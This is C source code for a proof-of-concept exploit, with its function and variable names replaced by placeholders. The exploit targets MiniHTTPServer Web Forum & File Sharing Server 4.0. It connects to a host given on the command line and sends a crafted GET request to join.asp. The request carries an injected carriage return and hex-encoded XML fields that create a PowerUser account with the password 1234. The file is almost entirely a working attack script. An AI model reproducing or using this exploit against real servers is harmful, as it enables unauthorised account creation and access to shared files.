
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int sockin ;
typedef int WSADATA ;


 int VAR_0 ;
 int FUNC_0 (int,int) ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_1 () ;
 scalar_t__ FUNC_2 (int ,int *) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,struct sockaddr*,int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int ,char*) ;
 struct hostent* FUNC_7 (char*) ;
 int FUNC_8 (int) ;
 int FUNC_9 (char*,int ,int) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,char*,int ,int ) ;
 int FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (char*,char*,char*) ;
 int VAR_4 ;
 int FUNC_14 (char*,...) ;
 int FUNC_15 (char*) ;
 char* FUNC_16 (char*) ;

int FUNC_17(int VAR_5, char *VAR_6[])
{


 unsigned char VAR_7[] =
 "/join.asp?frmUserID=uniquerandomusername&frmUserPass=pwd1234&frmMailBox=me@blah.net";




 unsigned char VAR_8[] =
 "\x3c\x2f\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e\x3c"
 "\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x31\x32\x33\x34"
 "\x3c\x2f\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x3c"
 "\x41\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e"
 "\x50\x6f\x77\x65\x72\x55\x73\x65\x72\x3c\x2f\x41"
 "\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e\x3c"
 "\x45\x6d\x61\x69\x6c\x3e\x61\x40\x68\x65\x72\x65"
 "\x2e\x6e\x65\x74";

 WSADATA VAR_9;
 char *VAR_10;
 struct hostent *VAR_11;
 int VAR_12, VAR_13;
 struct sockaddr_in VAR_14;
    char VAR_15[VAR_1];
 char VAR_16[VAR_1];

 FUNC_10("\n=================================================================================\n");
 FUNC_10("0-day MiniHTTPServer Web Forum & File Sharing Server 4.0 Add PowerUser Vulnerability \n");
 FUNC_10("Proof Of Concept Code and Discovery by Greg Linares <GLinares.Code [At] GMail [Dot] Com\n");
 FUNC_10("Exploits: invalid user-input on join.asp Membership Join Page\n");
 FUNC_10("Adds a PowerUser - which has full read/write to Level Medium - Low Shares and Forum Editing\n");
 FUNC_10("and still able to read all files on High Level shares.\n");
 FUNC_10("Reported: Wednesday October 25th 2006\n");
 FUNC_10("=================================================================================\n");

    if ( VAR_5 != 3 )
 {
     FUNC_10("usage: %s <IP-addr or hostname> <username to add>\n", VAR_6[0]);
  FUNC_5(0);
 }


 VAR_10 = VAR_6[1];
 if (FUNC_2(FUNC_0(1, 1), &VAR_9) < 0)
    {
     FUNC_6(VAR_4, "Error setting up with WinSock v1.1\n");
       FUNC_5(-1);
    }



 VAR_11 = FUNC_7(VAR_10);
    if (VAR_11 == ((void*)0))
    {
       FUNC_10("ERROR: Uknown host %s\n", VAR_10);
    FUNC_10("%s",VAR_10);
       FUNC_5(-1);
    }

    VAR_14.sin_family = VAR_0;
    VAR_14.sin_port = FUNC_8(80);
    VAR_14.sin_addr = *((struct in_addr *)VAR_11->h_addr);

    if ((VAR_12 = FUNC_12(VAR_0, VAR_3, 0)) == VAR_2)
    {
       FUNC_10("ERROR: Socket Error\n");
       FUNC_5(-1);
    }

    if ((FUNC_4(VAR_12, (struct sockaddr *) &VAR_14,
                sizeof(VAR_14))) == VAR_2)
    {
       FUNC_10("ERROR: Connect Error\n");
       FUNC_3(VAR_12);
       FUNC_1();
       FUNC_5(-1);
    }

    FUNC_10("Connected to [%s] on port [80], sending overflow....\n\n\n",
          VAR_10);



 FUNC_9(VAR_16, 0, 1024);
 FUNC_14(VAR_16, VAR_7);

 FUNC_14(VAR_16, "\r");
 FUNC_14(VAR_16, "\x3c\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e");
    FUNC_14(VAR_16, FUNC_16(VAR_6[2]));
 FUNC_14(VAR_16, VAR_8);


 FUNC_9(VAR_15, 0, 1024);
    FUNC_13(VAR_15, "GET %s HTTP/1.0\n\n", VAR_16);
    FUNC_11(VAR_12, VAR_15, FUNC_15(VAR_15), 0);
 FUNC_10("Exploit Sent to [%s] \n Login with Username: %s (lowercase) \n Password: 1234\n", VAR_10, FUNC_16(VAR_6[2]));
 FUNC_10("Any Questions/Comments/Concerns ==> GLinares.Code [at] Gmail [dot] com\n");
 FUNC_1();
    return 0;
}
